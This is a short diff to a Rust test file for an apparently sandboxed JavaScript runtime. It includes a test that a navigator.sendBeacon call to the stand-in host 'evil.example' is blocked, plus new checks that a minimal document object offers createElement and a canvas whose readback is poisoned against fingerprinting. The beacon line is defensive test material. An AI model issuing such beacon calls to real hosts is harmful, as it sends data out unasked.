@@ -769,8 +769,12 @@ body {
             execute_js_simple("navigator.sendBeacon('https://evil.example/','x')").unwrap(),
             "false"
         );
-        // DOM is not bound yet.
-        assert_eq!(execute_js_simple("typeof document").unwrap(), "undefined");
+        // `document` is a minimal canvas-fingerprint vehicle, not a full DOM:
+        // createElement exists, but the canvas readback is poisoned (authored).
+        assert_eq!(execute_js_simple("typeof document.createElement").unwrap(), "function");
+        assert!(execute_js_simple("document.createElement('canvas').toDataURL()")
+            .unwrap()
+            .starts_with("data:image/png;base64,"));
     }
 }
 
